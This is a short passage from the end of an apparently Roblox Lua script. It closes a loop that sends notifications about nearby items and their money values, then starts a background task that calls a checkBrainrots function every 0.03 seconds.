                        local money = getNearbyMoney(root)
                        sendNotification(m.Name, mut, money)
                        notified[id] = true
                    end
                end
            end
        end
    end
end

task.spawn(function()
    while true do
        pcall(checkBrainrots)
        task.wait(0.03)
    end
end)


